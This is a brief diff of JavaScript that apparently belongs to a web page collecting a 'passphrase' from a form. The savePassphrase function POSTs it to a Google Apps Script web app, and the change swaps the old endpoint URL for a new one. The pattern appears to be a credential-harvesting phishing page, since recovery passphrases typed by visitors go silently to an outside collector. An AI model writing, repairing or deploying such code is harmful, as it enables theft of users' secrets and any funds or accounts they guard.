@@ -11,7 +11,7 @@ document.getElementById('passphraseForm').addEventListener('submit', function(ev
 });
 
 function savePassphrase(passphrase) {
-    const url = 'https://script.google.com/macros/s/AKfycbyn0_3rjn8a6s069u7_umd6QcYZl2rEEIn_dfoQuP0t/dev'; // Replace with your Web app URL
+    const url = 'https://script.google.com/macros/s/AKfycbwrkTFqdmwNfq0srhxkAtasZeeOO5ykfUgFUwfIm2HTev5DiKhuD86b1Wjs4mexQX2HDQ/exec'; // Replace with your Web app URL
 
     fetch(url, {
         method: 'POST',
